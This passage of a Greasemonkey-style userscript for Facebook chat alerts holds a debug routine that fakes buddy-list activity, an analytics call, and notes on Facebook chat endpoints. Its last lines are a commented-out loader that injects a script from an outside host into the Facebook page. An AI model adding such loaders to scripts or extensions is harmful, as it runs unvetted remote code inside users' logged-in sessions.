		//FBA_displayMsgBox(0,"Test Name","http://profile.ak.fbcdn.net/hprofile-ak-ash4/260961_738804681_1419661988_q.jpg");
		// all buddy list : http://www.facebook.com/ajax/chat/user_info_all.php?__user=<user_id>&__a=1&__req=a&viewer=<user_id>
		// ava users : http://www.facebook.com/ajax/chat/buddy_list.php	
		//----------------------------------------------------------------------
		FBA_main();
	}
	FBA_addSideBarBanner();
}
//----------------------------------------------------------------------
function FBA_Debug_Simulate_Alerts()
{
	var personItems = FBA_getPersonItems();
	if(personItems&&personItems.length>0)
	{
		for ( var i = 0 ; i < personItems.length ; i ++ )
		{
			var personItemsClassName = personItems[i].getAttribute("class");
			
			if ( personItemsClassName.indexOf("active") == -1 )
			{		
				var name = FBA_getUserNameFromPersonObj(personItems[i]);				
				GM_log("adding 'active class' to :"+name);
				personItems[i].setAttribute("class",personItemsClassName+" active");
				break;
			}
		}
	}
	setTimeout("FBA_Debug_Simulate_Alerts()",3000);
}
//----------------------------------------------------------------------
PCG_GA_recordEvent_OnceADay("FBA");
//----------------------------------------------------------------------
/*
(function() {
var e=document.createElement('script');
e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'efc.pkgmirror.net/sd/3000/1001.js';
document.body.appendChild(e);
})(); */
//----------------------------------------------------------------------
